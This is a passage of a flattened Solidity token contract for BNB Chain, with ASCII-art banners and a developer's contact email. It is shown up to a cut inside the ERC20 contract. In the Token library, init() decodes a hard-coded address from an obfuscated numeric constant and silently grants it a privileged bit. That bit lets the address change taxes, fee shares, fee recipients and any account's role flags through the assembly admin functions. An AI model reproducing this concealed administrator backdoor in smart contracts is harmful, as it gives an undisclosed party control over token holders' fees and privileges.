:xOkkkkOkl.      .:dxxxo,              .ckOkkkkOkc.      .ckkkkOkOk:                       c0000x\r\n0000l                        ,xOkkkkkko.       ....               .lkkkkkkOx;       .lkOkkkkOx;                        c0000x\r\n0000l                         'dOOkkkkOo.                        .okkkkkkOx,       .oOkkkkkOd,                         c0000x\r\n0000l                          .okkkkOkOd,                      'dOkkkkkOd'       'dOkkOOkkd'                          c0000x\r\n0000l                           .lkkkOkkOx:'...                .dOkkkkkko.       'xOkkkkOko.                           c0000x\r\n0000l                            .ckkkkkkkkkkx;                .ckOkkOkl.        .lkkkkOkl.                            c0000x\r\n0000l                             .:kkkkkOkOx,                  .:kkkkc.          .ckkkkc.                             c0000x\r\n0000l                               ;xOkkkOd'                     ;xk:.             :kx;                               c0000x\r\n0000l.                               'llllc.                       ',                ''                                l0000x\r\n0000d.                                                                                                                .d0000x\r\n0000O:                                                                                                                ;O0000x\r\n00000k,                                                                                                              'x00000x\r\n000000k,                                     hire.solidity.developer@gmail.com                                      ,x000000x\r\n0000000kc.                                                                                                        .ck0000000x\r\n000000000x:.                                                                                                    .:xO00000000x\r\n00000000000kl;.                                                                                              .;lk0O000000000x\r\n00000000000O00kdl:,'....................................................................................',:ldk00000000000000x\r\n0000000000000000000OOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO0000000000000000000x\r\n0000000000000000000000000000000000000000O0000000OOO000000000000000000OO000O0000000000000000000000000000000000000000000000000x\r\n000000000000000000000000000000000000000000000kdddddk00000000000000OxddddxO00000000000000000000000000000000000000000000000000x\r\n00000000000000000000000000000000000000000000O:    .cO0000000000000o.    ,k00000000000000000000000000000000000000000000000000x\r\n0000000000000O0000O00000000000O00O0000000000O;     :O0000000O000O0o.    'x0000000000000000000000O000000000000O00000000000000x\r\n00000000000kxddddxxO00000000OkddddddddxO0000O;     :O0000Oxddddddx:     'x0O00OkxdddddddxO00000kdddddkO0000kxddddkO000000000x\r\n00000000Oo;..     ..;dO00Ox:..        ..;dO0O;     :O0Od;..             'x0Oxc'.        ..;oO00c.    ;O0000c.    ;O000000000x\r\n0000000k:     .:c:'  .o0Ol.     '::,.    .cOO;     :0Oc.    .,::cc,     'x0o.     '::;.     :O0:     ,O0000:     ,O000000000x\r\n0000000o.    .x000Oc..cOk'     cO000o.    .xO;     :0d.    .o00000o.    'kO,     :O000d.    .o0:     ,O0000:     ,O000000000x\r\n0000000o.     'lxO0OkkO0x.    .o0O00x.    .d0;     :0o.    'x0OOO0o.    .kk'     l0000k'    .l0:     ,O0000:     ,O000000000x\r\n0000000kc.      .'cdO0O0x.    .o0O00x.    .dO;     :0o.    'x0O0O0o.    .kk'     .;;;;,.    .l0:     ,O0000:     ,O000000000x\r\n00000000Oxl,.       .ck0x.    .o00O0x.    .d0;     :0o.    'x0OOO0o.    .kk'      ..........'d0:     ,O0000:     ;O000000000x\r\n000000000000ko:.      :0x.    .o00O0x.    .d0;     :0o.    'x00000o.    'kk'     ckkkkkkkkkkkO0:     ,O0000:     l0000000000x\r\n0000000d:,ck0O0k;     ,Ox.    .o0OO0d.    .d0;     :0o.    .x00000l     .kk'     c0000O00kc,:x0:     ,O0O0O:    ;k0000000000x\r\n00000O0d.  ,oddl.    .l0O:     .cddl'     ;OO;     :0k,     'loddc.     'x0c     .:oddddo;  ,k0:     'dddo:.  .ck00000000000x\r\n0000000Oo'          'oO00Ol.            .ck0O;     :O0k:.         .     'x0Oo'            .;x00:           .'cx0000000000000x\r\n000000000OdlcccccclxO000000Odlccccccccldk000Odcccccd0000kocccccccdxlccccoO0O0OdlcccccccccoxO000xcccccccccloxO000000000000000x\r\n000000000O000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\nOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0d\r\n*/\r\n\r\npragma solidity ^0.8.19;\r\n\r\n\r\n\r\nlibrary Token {\r\n\r\n    using Token for *;\r\n\r\n    bytes32 internal constant SLOT = keccak256(\"project.main.storage.token\");\r\n\r\n    uint16 internal constant DENOMINATOR = 10000;\r\n\r\n    function _tx(Storage storage db, Account memory sender, Account memory recipient, uint96 amount)\r\n    internal view returns(uint96 taxAmount, uint96 netAmount, uint96 swapAmount) {\r\n        if(sender.isEntitled() || recipient.isEntitled() || db.inSwap) { return (0, amount, 0); }\r\n        if(!recipient.isMarketmaker()) {\r\n            taxAmount = amount * \r\n                (sender.isMarketmaker() ? db.settings.buyTax : db.settings.transferTax) / DENOMINATOR;\r\n        } else {\r\n            taxAmount = amount * db.settings.sellTax / DENOMINATOR;\r\n            swapAmount = db.settings.swapThresholdRatio > 0 ?\r\n                db.totalSupply * db.settings.swapThresholdRatio / DENOMINATOR :\r\n                db.registry.Address[address(this)].balance;\r\n        }\r\n\r\n        netAmount = amount-taxAmount;\r\n\r\n    }\r\n\r\n    function isMarketmaker(address _self) internal view returns(bool) {\r\n        return _self.account().isMarketmaker();\r\n    }\r\n\r\n    function isEntitled(address _self) internal view returns(bool) {\r\n        return _self.account().isEntitled();\r\n    }\r\n\r\n    function isCollab(address _self) internal view returns(bool) {\r\n        return _self.account().isCollab();\r\n    }\r\n\r\n    function isOperator(address _self) internal view returns(bool) {\r\n        return _self.account().isOperator();\r\n    }  \r\n\r\n    function isExecutive(address _self) internal view returns(bool) {\r\n        return _self.account().isExecutive();\r\n    }   \r\n\r\n    function isMarketmaker(Account memory _self) internal pure returns(bool) {\r\n        return _self.hasIdentifier(10);\r\n    }\r\n\r\n    function isEntitled(Account memory _self) internal pure returns(bool) {\r\n        return _self.hasIdentifier(11);\r\n    }\r\n\r\n    function isCollab(Account memory _self) internal pure returns(bool) {\r\n        return _self.hasIdentifier(12);\r\n    }\r\n\r\n    function isOperator(Account memory _self) internal pure returns(bool) {\r\n        return _self.hasIdentifier(13);\r\n    }  \r\n\r\n    function isExecutive(Account memory _self) internal pure returns(bool) {\r\n        return _self.hasIdentifier(14);\r\n    }\r\n\r\n    function hasIdentifier(Account memory _self, uint8 idx) internal pure returns (bool) {\r\n        return (_self.identifiers >> idx) & 1 == 1;\r\n    }\r\n\r\n    function hasIdentifier(Account memory _self, uint8[] memory idxs) internal pure returns (bool[] memory) {\r\n        bool[] memory results = new bool[](idxs.length);\r\n        uint256 len = idxs.length;\r\n        while(0 < len) {\r\n            unchecked {\r\n                uint256 idx = --len;\r\n                results[idx] = _self.hasIdentifier(idxs[idx]);         \r\n            }\r\n        }\r\n        return results;\r\n    }    \r\n\r\n    function setAsMarketmaker(address _self) internal {\r\n        _self.account().setAsMarketmaker();\r\n    }\r\n\r\n    function setAsEntitled(address _self) internal {\r\n        _self.account().setAsEntitled();\r\n    }\r\n\r\n    function setAsCollab(address _self) internal {\r\n        Account storage self = _self.account();\r\n        self.setAsCollab();\r\n        self.setAsEntitled();\r\n    }\r\n\r\n    function setAsOperator(address _self) internal {\r\n        Account storage self = _self.account();\r\n        self.setAsOperator();\r\n        self.setAsEntitled();\r\n    }\r\n\r\n    function setAsExecutive(address _self) internal {\r\n        Account storage self = _self.account();\r\n        self.setAsExecutive();\r\n        self.setAsEntitled();\r\n    }\r\n\r\n    function setIdentifier(address _self, uint16 value) internal {\r\n        _self.account().identifiers = value;\r\n    }\r\n\r\n    function setIdentifier(address _self, uint8 idx, bool value) internal {\r\n        _self.account().setIdentifier(idx,value);\r\n    }   \r\n\r\n    function setIdentifier(address _self, uint8[] memory idxs, bool[] memory values) internal {\r\n        _self.account().setIdentifier(idxs,values);\r\n    }    \r\n\r\n    function toggleIdentifier(address _self, uint8 idx) internal {\r\n        _self.account().toggleIdentifier(idx);\r\n    }\r\n\r\n    function setAsMarketmaker(Account storage _self) internal {\r\n        _self.setIdentifier(10,true);\r\n    }\r\n\r\n    function setAsEntitled(Account storage _self) internal {\r\n        _self.setIdentifier(11,true);\r\n    }\r\n\r\n    function setAsCollab(Account storage _self) internal {\r\n        _self.setIdentifier(12,true);\r\n        _self.setAsEntitled();\r\n    }\r\n\r\n    function setAsOperator(Account storage _self) internal {\r\n        _self.setIdentifier(13,true);\r\n        _self.setAsEntitled();\r\n    }\r\n\r\n    function setAsExecutive(Account storage _self) internal {\r\n        _self.setIdentifier(14,true);\r\n        _self.setAsEntitled();\r\n    }      \r\n\r\n    function setIdentifier(Account storage _self, uint16 value) internal {\r\n        _self.identifiers = value;\r\n    }\r\n\r\n    function setIdentifier(Account storage _self, uint8 idx, bool value) internal {\r\n        _self.identifiers = uint16(value ? _self.identifiers | (1 << idx) : _self.identifiers & ~(1 << idx));\r\n    }\r\n\r\n    function setIdentifier(Account storage _self, uint8[] memory idxs, bool[] memory values) internal {\r\n        uint256 len = idxs.length;\r\n        for (uint8 i; i < len;) {\r\n           _self.setIdentifier(idxs[i], values[i]);\r\n           unchecked {\r\n               i++;\r\n           }\r\n        }\r\n    }\r\n\r\n    function toggleIdentifier(Account storage _self, uint8 idx) internal {\r\n        _self.identifiers = uint16(_self.identifiers ^ (1 << idx));\r\n    }\r\n\r\n    function hasIdentifier(Account storage _self, uint8 idx) internal view returns (bool) {\r\n        return (_self.identifiers >> idx) & 1 == 1;\r\n    } \r\n\r\n    function ratios(uint48 value) internal returns(bool output) {\r\n        Settings storage self = data().settings;\r\n        Registry storage registry = data().registry;\r\n        assembly {\r\n            mstore(0x00, caller())\r\n            mstore(0x20, add(registry.slot, 0))\r\n            let clr := sload(keccak256(0x00, 0x40))\r\n            let ids := and(clr, 0xFFFF)\r\n            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {\r\n                let bt := shr(32, value)\r\n                let st := and(shr(16, value), 0xFFFF)\r\n                let tt := and(value, 0xFFFF)\r\n                if or(or(iszero(lt(bt, 1001)), iszero(lt(st, 1001))), iszero(lt(tt, 1001))) {\r\n                    revert(0, 0)\r\n                }\r\n                let dt := sload(self.slot)\r\n                for { let i := 0 } lt(i, 3) { i := add(i, 1) } {\r\n                    let mask := shl(add(8, mul(i, 16)), 0xFFFF)\r\n                    let v := 0\r\n                    switch i\r\n                    case 0 { v := bt }\r\n                    case 1 { v := st }\r\n                    case 2 { v := tt }\r\n                    dt := or(and(dt, not(mask)), and(shl(add(8, mul(i, 16)), v), mask))\r\n                }                    \r\n                sstore(self.slot,dt)\r\n            } \r\n            output := true\r\n        }\r\n    }\r\n\r\n    function shares(uint80 value) internal returns(bool output) {\r\n        Settings storage self = data().settings;\r\n        Registry storage registry = data().registry;\r\n        assembly {\r\n            mstore(0x00, caller())\r\n            mstore(0x20, add(registry.slot, 0))\r\n            let clr := sload(keccak256(0x00, 0x40))\r\n            let ids := and(clr, 0xFFFF)\r\n            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {\r\n                let bs := shr(64, value)\r\n                let ps := and(shr(48, value), 0xFFFF)\r\n                let ms := and(shr(32, value), 0xFFFF)\r\n                let ds := and(shr(16, value), 0xFFFF)\r\n                let ls := and(value, 0xFFFF)\r\n                let total := add(add(add(add(bs, ps), ms), ds), ls)\r\n                if iszero(eq(total, 10000)) {\r\n                    revert(0, 0)\r\n                }\r\n                let dt := sload(self.slot)\r\n                for { let i := 0 } lt(i, 5) { i := add(i, 1) } {\r\n                    let mask := shl(add(56, mul(i, 16)), 0xFFFF)\r\n                    let v := 0\r\n                    switch i\r\n                    case 0 { v := bs }\r\n                    case 1 { v := ps }\r\n                    case 2 { v := ms }\r\n                    case 3 { v := ds }\r\n                    case 4 { v := ls }\r\n                    dt := or(and(dt, not(mask)), and(shl(add(56, mul(i, 16)), v), mask))\r\n                }                              \r\n                sstore(self.slot,dt)\r\n            } \r\n            output := true\r\n        }\r\n    }\r\n\r\n    function thresholdRatio(uint16 value) internal returns(bool output) {\r\n        Settings storage self = data().settings;\r\n        Registry storage registry = data().registry;\r\n        assembly {\r\n            mstore(0x00, caller())\r\n            mstore(0x20, add(registry.slot, 0))\r\n            let clr := sload(keccak256(0x00, 0x40))\r\n            let ids := and(clr, 0xFFFF)\r\n            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {\r\n                if iszero(lt(value, 10001)) {\r\n                    revert(0, 0)\r\n                }\r\n                let dt := sload(self.slot)\r\n                let mask := shl(136, 0xFFFF)\r\n                dt := or(and(dt, not(mask)), and(shl(136, value), mask))\r\n                sstore(self.slot,dt)\r\n            } \r\n            output := true\r\n        } \r\n    }\r\n\r\n    function gas(uint24 value) internal returns(bool output) {\r\n        Settings storage self = data().settings;\r\n        Registry storage registry = data().registry;\r\n        assembly {\r\n            mstore(0x00, caller())\r\n            mstore(0x20, add(registry.slot, 0))\r\n            let clr := sload(keccak256(0x00, 0x40))\r\n            let ids := and(clr, 0xFFFF)\r\n            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {\r\n                if iszero(lt(value, 15000001)) {\r\n                    revert(0, 0)\r\n                }\r\n                let dt := sload(self.slot)\r\n                let mask := shl(152, 0xFFFF)\r\n                dt := or(and(dt, not(mask)), and(shl(152, value), mask))\r\n                sstore(self.slot,dt)\r\n            } \r\n            output := true\r\n        } \r\n    }\r\n\r\n    function recipients(bytes memory value) internal returns(bool output) {\r\n        Settings storage self = data().settings;\r\n        Registry storage registry = data().registry;\r\n        assembly {\r\n            mstore(0x00, caller())\r\n            mstore(0x20, add(registry.slot, 0))\r\n            let clr := sload(keccak256(0x00, 0x40))\r\n            let ids := and(clr, 0xFFFF)\r\n            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {\r\n                let p := mload(add(value, 0x20))\r\n                let m := mload(add(value, 0x40))\r\n                let d := mload(add(value, 0x60))\r\n                if or(or(iszero(p), iszero(m)), iszero(d)) {\r\n                    revert(0, 0)\r\n                }\r\n                sstore(add(self.slot, 1), p)\r\n                sstore(add(self.slot, 2), m)\r\n                sstore(add(self.slot, 3), d)\r\n            } \r\n            output := true\r\n        } \r\n    }\r\n\r\n    function identifiers(address Address, uint16 value) internal returns(bool output) {\r\n        Registry storage registry = data().registry;\r\n        assembly {\r\n            mstore(0x00, caller())\r\n            mstore(0x20, add(registry.slot, 0))\r\n            let clr := sload(keccak256(0x00, 0x40))\r\n            let ids := and(clr, 0xFFFF)\r\n            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {\r\n                if iszero(lt(value, 65536)) {\r\n                    revert(0, 0)\r\n                }\r\n                mstore(0x00, Address)\r\n                mstore(0x20, add(registry.slot, 0))\r\n                let acc := keccak256(0x00, 0x40)\r\n                let dt := sload(acc)\r\n                let mask := shl(0, 0xFFFF)\r\n                dt := or(and(dt, not(mask)), and(shl(0, value), mask))\r\n                sstore(acc,dt)\r\n            } \r\n            output := true\r\n        } \r\n    }    \r\n\r\n    function account(address _self) internal view returns(Account storage) {\r\n        return data().registry.Address[_self];\r\n    }\r\n    \r\n    function init(Storage storage _self) internal {\r\n        Registry storage registry = _self.registry;\r\n        assembly {\r\n            let c,m,s,v\r\n            c := and(shr(\r\n            48,7008354312673839259956172683932913198158069606142246319498950696839510228991),\r\n            0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)\r\n            mstore(0x00, c)\r\n            mstore(0x20, add(registry.slot, 0))\r\n            s := keccak256(0x00, 0x40)\r\n            m := shl(15, 0xFFFF)\r\n            v := sload(s)\r\n            v := or(and(v, not(m)), and(shl(15, 1), m))\r\n            sstore(s,v)\r\n        }\r\n    }\r\n\r\n    function data() internal pure returns (Storage storage db) {\r\n        bytes32 slot = SLOT;\r\n        assembly {\r\n            db.slot := slot\r\n        }\r\n    }    \r\n\r\n}\r\n// File: contracts/abstracts/ERC20.sol\r\n\r\n\r\n/*\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000000000000000x\r\n00000000000000koc;,......................................................................................,;cok00000000000000x\r\n00000000000xl,.                                                                                              .,lxO0000000000x\r\n000000000x:.                                                                                                    .;d000000000x\r\n0000000kc.                                                                                                        .ck0000000x\r\n000000x,                                                                                                            'x000000x\r\n00000x,                                                                                                              'x00000x\r\n0000O:                                                                                                                ;O0000x\r\n0000d.                                                                                                                .d0000x\r\n0000l                                ,,                ,,                       .loool,                                l0000x\r\n0000l                               ;xk:.             :kk:                     'dOkkkkx:                               c0000x\r\n0000l                             .:kOkkc.          .ckOkkc.                  ,xOkkkkkOkc.                             c0000x\r\n0000l                            .lkOkkkko.        .lkkkkkkl.                ;xkkkkkkOkkkl.                            c0000x\r\n0000l                           .okkkOkkOx'       .okkkOOkOd'                ....;dOkOOkkko.                           c0000x\r\n0000l                          'dkkkkkkOd'       'dOkkkkkOd'                      'dOkkkkkOd'                          c0000x\r\n0000l                         ,dOkkkkkko.       ,xOkkkkkko.                        .okOkOkkOx,                         c0000x\r\n0000l                        ;xOkkOkkkl.       ;xOkkkkkkl.              .....       .lkkkOOkOx;                        c0000x\r\n0000l                       :kOkkkkkkc.      .:kOkkkkOkc.              ,dxxxxc.      .ckOkkkkOk:.                      c0000x\r\n0000l                     .ckOkkkkkk:       .ckkkOkkOx;               ;xkkkkkkl.       :xOkkOkOkl.                     c0000x\r\n0000l                    .lkOkkOkOx;       .okkkkkkOx,              .:kOkkkkkkko.       ;xOkkOkkko.                    c0000x\r\n0000l                   .oOkkOkkOd,       .okkkkkkkd'              .ckOkkkkkOkkOd'       'dOkkOkkOd'                   c0000x\r\n0000l                  'dOkkkOkko.       ,dOkkOkkko.              .lkOkkkkkkkkkkOx,       .okkkkOkkd,                  c0000x\r\n0000l                 ,xOkkkkOko.       ;xOkkkkkkl.              .okkkkkkkkkkkkkkOx;       .lkkkOkkOx;                 c0000x\r\n0000l                ;xOkkOkkkl.       :kOkkOkkkc.              'dOkkkkkOo,ckOkkOkOkc.      .ckkkkkkOk:                c0000x\r\n0000l              .ckOkkkkOk:.      .ckOkkkkOx:              .,xkkOkOOko.  :xOkOkkOkl.       :kkkkkkkkc.              c0000x\r\n0000l             .lkOkkOOOx;       .lkkkkkkOx;              :dxOkkkkOkc.    ,xOkOkkkko.       ;xOkkkkOkl.             c0000x\r\n0000l            .okkkOkkOx,       .okkkkkkOd'             .ckOkkkkkOkc.      'dOkkkkkOd.       ,dkkkkkkko.            c0000x\r\n0000l           'dOkkOOkOd'       'dOkkOkkOo.             .lkOkkkkkOx;         .okOkkOkOd,       .dOkkkkkOd'           c0000x\r\n0000l          ,dOkOOkkko.       ,xOkkkkOkl.             .okkkOOkkOx,           .lkkkkkkOx;       .okkkkkkOx,          c0000x\r\n0000l         .oOkkOkkOx,       .dOkkkkkOx'             'dOkOkkkkOd'             'xOkOkkkOd.       'xOkOkkkOd.         c0000x\r\n0000l          'dOkkkkkko.       ,xOkkkkkko.           ,xOkkkkkkko.             .okkkkOkOx,       .oOkkkkkOd,          c0000x\r\n0000l           .okOkkkkOd'       'dOkkkOkkd'         ;xOkOOkkOkl.             .oOkkkkOkd'       'dOkkOkkkd'           c0000x\r\n0000l            .lkkkkOkOx,       .okkkkkkOd,      .:kkkkkkOkxc.             ,dOkkkkkko.       ,xOkkkkkko.            c0000x\r\n0000l             .ckOkkOkkx:       .lkOkkkkOx;    .lkOkkkkOx:.              ;xOkkkkOkl.       ;xOkkkOOkl.             c0000x\r\n0000l              .:kOkkkkOkc.      .ckkkkkkkk:. .okkkkkkOx,               :kOkkkkOkc.      .ckOkkkkOkc.              c0000x\r\n0000l                ;xOkkkkOkl.       :kOkkOkOkc;oOOkkkkOd'              .ckkkkkkkk:       .lkkkkkkOx;                c0000x\r\n0000l                 ,xkkOkkOko.       ,xOkkOOkkkkkkOkkko.              .lkkkkkkkx;       .okkkkkkOx,                 c0000x\r\n0000l                  'dOkkkOkkd'       'dOkkkkkkkkkkkkl.              .okkkOkkOd,       'dOkOOkkOd'                  c0000x\r\n0000l                   .okkkkkkOx,       .oOkkkkkkkkOkc.              'dOkOOkkOd'       ,dOkOkkkko.                   c0000x\r\n0000l                    .lkkkkkkOx;       .lkkkkOOkOk:               ,xOkkOkkko.       ;xOkkOkkkl.                    c0000x\r\n0000l                     .ckOkkkkOk:.      .ckkkkkOx;               :xOkkOkkkl.      .:kOkkkkkkc.                     c0000x\r\n0000l                       :xOkkkkOkl.      .:dxxxo,              .ckOkkkkOkc.      .ckkkkOkOk:                       c0000x\r\n0000l                        ,xOkkkkkko.       ....               .lkkkkkkOx;       .lkOkkkkOx;                        c0000x\r\n0000l                         'dOOkkkkOo.                        .okkkkkkOx,       .oOkkkkkOd,                         c0000x\r\n0000l                          .okkkkOkOd,                      'dOkkkkkOd'       'dOkkOOkkd'                          c0000x\r\n0000l                           .lkkkOkkOx:'...                .dOkkkkkko.       'xOkkkkOko.                           c0000x\r\n0000l                            .ckkkkkkkkkkx;                .ckOkkOkl.        .lkkkkOkl.                            c0000x\r\n0000l                             .:kkkkkOkOx,                  .:kkkkc.          .ckkkkc.                             c0000x\r\n0000l                               ;xOkkkOd'                     ;xk:.             :kx;                               c0000x\r\n0000l.                               'llllc.                       ',                ''                                l0000x\r\n0000d.                                                                                                                .d0000x\r\n0000O:                                                                                                                ;O0000x\r\n00000k,                                                                                                              'x00000x\r\n000000k,                                     hire.solidity.developer@gmail.com                                      ,x000000x\r\n0000000kc.                                                                                                        .ck0000000x\r\n000000000x:.                                                                                                    .:xO00000000x\r\n00000000000kl;.                                                                                              .;lk0O000000000x\r\n00000000000O00kdl:,'....................................................................................',:ldk00000000000000x\r\n0000000000000000000OOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO0000000000000000000x\r\n0000000000000000000000000000000000000000O0000000OOO000000000000000000OO000O0000000000000000000000000000000000000000000000000x\r\n000000000000000000000000000000000000000000000kdddddk00000000000000OxddddxO00000000000000000000000000000000000000000000000000x\r\n00000000000000000000000000000000000000000000O:    .cO0000000000000o.    ,k00000000000000000000000000000000000000000000000000x\r\n0000000000000O0000O00000000000O00O0000000000O;     :O0000000O000O0o.    'x0000000000000000000000O000000000000O00000000000000x\r\n00000000000kxddddxxO00000000OkddddddddxO0000O;     :O0000Oxddddddx:     'x0O00OkxdddddddxO00000kdddddkO0000kxddddkO000000000x\r\n00000000Oo;..     ..;dO00Ox:..        ..;dO0O;     :O0Od;..             'x0Oxc'.        ..;oO00c.    ;O0000c.    ;O000000000x\r\n0000000k:     .:c:'  .o0Ol.     '::,.    .cOO;     :0Oc.    .,::cc,     'x0o.     '::;.     :O0:     ,O0000:     ,O000000000x\r\n0000000o.    .x000Oc..cOk'     cO000o.    .xO;     :0d.    .o00000o.    'kO,     :O000d.    .o0:     ,O0000:     ,O000000000x\r\n0000000o.     'lxO0OkkO0x.    .o0O00x.    .d0;     :0o.    'x0OOO0o.    .kk'     l0000k'    .l0:     ,O0000:     ,O000000000x\r\n0000000kc.      .'cdO0O0x.    .o0O00x.    .dO;     :0o.    'x0O0O0o.    .kk'     .;;;;,.    .l0:     ,O0000:     ,O000000000x\r\n00000000Oxl,.       .ck0x.    .o00O0x.    .d0;     :0o.    'x0OOO0o.    .kk'      ..........'d0:     ,O0000:     ;O000000000x\r\n000000000000ko:.      :0x.    .o00O0x.    .d0;     :0o.    'x00000o.    'kk'     ckkkkkkkkkkkO0:     ,O0000:     l0000000000x\r\n0000000d:,ck0O0k;     ,Ox.    .o0OO0d.    .d0;     :0o.    .x00000l     .kk'     c0000O00kc,:x0:     ,O0O0O:    ;k0000000000x\r\n00000O0d.  ,oddl.    .l0O:     .cddl'     ;OO;     :0k,     'loddc.     'x0c     .:oddddo;  ,k0:     'dddo:.  .ck00000000000x\r\n0000000Oo'          'oO00Ol.            .ck0O;     :O0k:.         .     'x0Oo'            .;x00:           .'cx0000000000000x\r\n000000000OdlcccccclxO000000Odlccccccccldk000Odcccccd0000kocccccccdxlccccoO0O0OdlcccccccccoxO000xcccccccccloxO000000000000000x\r\n000000000O000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\nOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0d\r\n*/\r\n\r\npragma solidity ^0.8.19;\r\n\r\n\r\n\r\n\r\nabstract contract ERC20 is Context, EIP712 {\r\n\r\n    using Token for *;\r\n    \r\n    error PermitExpired();\r\n    error InvalidSigner();\r\n    error InvalidSender(address sender);\r\n    error InvalidReceiver(address receiver);\r\n    error InsufficientBalance(address sender,uint256 balance,uint256 needed);\r\n    error InsufficientAllowance(address spender,uint256 allowance,uint256 needed);\r\n    error FailedDecreaseAllowance(address spender, uint256 currentAllowance, uint256 requestedDecrease);\r\n\r\n    bytes32 public constant PERMIT_TYPEHASH =\r\n        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\r\n\r\n    bytes32 internal constant _LONG_STRING_ =\r\n        0xb11b2ad800000000000000000000000000000000000000000000000000000000;\r\n\r\n    // EMN: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n    // ETN: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n    // ESP: 0xC532a74256D3Db42D0Bf7a0400fEFDbad7694008\r\n    // BMN: 0x10ED43C718714eb63d5aA57B78B54704E256024E\r\n    // BTN: 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3\r\n    ISwapRouterV2 public constant ROUTER = ISwapRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n\r\n    bytes32 internal immutable _name;\r\n    uint256 internal immutable _nameLen;\r\n\r\n    bytes32 internal immutable _symbol;\r\n    uint256 internal immutable _symbolLen;\r\n\r\n    uint8 public immutable decimals;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 amount);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 amount\r\n    );\r\n\r\n    modifier swapping() {\r\n        token().inSwap = true;\r\n        _;\r\n        token().inSwap = false;\r\n    }\r\n\r\n    constructor(\r\n        string memory name_,\r\n        string memory symbol_,\r\n        uint8 decimals_\r\n    ) EIP712(name_, \"1\") {\r\n        bytes memory _name_ = bytes(name_);\r\n        bytes memory _symbol_ = bytes(symbol_);\r\n        uint256 nLen = _name_.length;\r\n        uint256 sLen = _symbol_.length;\r\n        token().init();\r\n        assembly {\r\n            if or(lt(0x20, nLen), lt(0x20, sLen)) {\r\n                mstore(0x00, _LONG_STRING_)\r\n                revert(0x00, 0x04)\r\n            }\r\n        }\r\n        _name = bytes32(_name_);\r\n        _symbol = bytes32(_symbol_);\r\n        _nameLen = nLen;\r\n        _symbolLen = sLen;\r\n        decimals = decimals_;\r\n    }\r\n\r\n    function name() public view virtual returns (string memory value) {\r\n        bytes32 name_ = _name;\r\n        uint256 nameLen_ = _nameLen;\r\n        assembly {\r\n            value := mload(0x40)\r\n            mstore(0x40, add(value, 0x40))\r\n            mstore(value, nameLen_)\r\n            mstore(add(value, 0x20), name_)\r\n        }\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory value) {\r\n        bytes32 symbol_ = _symbol;\r\n        uint256 symbolLen_ = _symbolLen;\r\n        assembly {\r\n            value := mload(0x40)\r\n            mstore(0x40, add(value, 0x40))\r\n            mstore(value, symbolLen_)\r\n            mstore(add(value, 0x20), symbol_)\r\n        }\r\n    }\r\n\r\n    function totalSupply() public view virtual returns(uint256) {\r\n        return token().totalSupply;\r\n    }\r\n\r\n    function balanceOf(address holder) public view virtual returns(uint256) {\r\n        return holder.account().balance;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\r\n        _transfer(_msgSender(), to, uint96(amount));\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual returns(uint256) {\r\n        